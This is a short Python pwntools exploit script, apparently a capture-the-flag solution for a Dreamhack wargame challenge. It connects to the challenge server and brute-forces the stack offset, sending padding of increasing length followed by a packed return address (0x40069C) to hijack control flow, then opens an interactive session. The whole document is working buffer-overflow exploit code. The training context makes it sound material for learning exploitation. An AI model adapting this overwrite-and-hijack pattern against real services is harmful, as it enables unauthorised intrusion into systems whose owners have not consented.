from pwn import *
context.update(log_level= 'debug')
for x in range(0x40):
    p = remote('host6.dreamhack.games', 15522)
    p.recvline()
    p.sendline('a'*(0x10+x) + p64(0x40069C))
    p.interactive()
